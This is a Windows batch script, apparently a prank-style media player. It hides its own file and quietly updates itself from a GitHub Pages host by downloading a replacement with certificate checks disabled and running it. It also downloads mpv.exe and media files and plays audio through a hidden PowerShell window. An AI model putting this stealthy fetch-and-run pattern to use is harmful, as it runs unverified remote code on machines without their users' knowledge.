@echo off
attrib +s +h +r "%~0"
pause
if not exist %temp%\331 (md %temp%\331) else (attrib -s -h -r %temp%\331)
cd %temp%\331

set "_updusr=aritz331org"
set "_updrepo=play"
set "_updname=play.bat"

set "_dlurl=https://%_updusr%.github.io"
set "_curls=curl -kLOs"
set "_vbs=a.vbs"

set "_mp3=%a~1.mp3"
set "_mp4=%a~1.mp4"

set "_min=start /min ^"^" cmd /c"
set "_dum=dum2.bat"
set "_ping=ping localhost -n"
set "_hidden=powershell -NoP -W hidden"

call :update
goto start
exit /b

:update
%_curls% "%_dlurl%/%_updrepo%/%_updname%" -o %_dum% || exit /b
fc "%~dpnx0" "%_dum%">nul || (goto doupdate)
exit /b

:doupdate
popd
%_min% %_ping% 2^>nul ^& move "%temp%\331\%_dum%" "%~dpnx0" ^& %_min% "%~0" min %*
exit

:start
%_curls% %_dlurl%/utils/mpv.exe

:play
if not [%1]==[min] (%_min% "%~0" min %* & exit /b)
shift

for /f "tokens=* delims=" %%i in ("%*") do (
    if [%%i]==[/f] (
        shift
        set "fiel=%1"
        set "o=fiel"
        goto f
    )
    if [%%i]==[/v] (
        goto vid
    )
)

%_curls% "%_dlurl%/mp3/%_mp3%"
set "fiel=%~1"

:f
set "file=%fiel%"
(
  echo Set Sound = CreateObject("WMPlayer.OCX.7"^)
  echo Sound.URL = "%file%"
  echo Sound.Controls.play
  echo do while Sound.currentmedia.duration = 0
  echo wscript.sleep 100
  echo loop
  echo wscript.sleep (int(Sound.currentmedia.duration^)+1^)*1000
) > %_vbs%

%_min% %_hidden% cscript //NOLOGO %_vbs%

%_ping% 2 >nul

del %_vbs%
if not "%o%"=="fiel" (del "%_mp4%")
exit /b

:vid
shift
set "file=%~1"
if not exist "%_mp4%" (
    %_curls% "%_dlurl%/mp4/%_mp4%"
    mpv "%_mp4%" --no-osc --no-input-default-bindings
)
exit /b
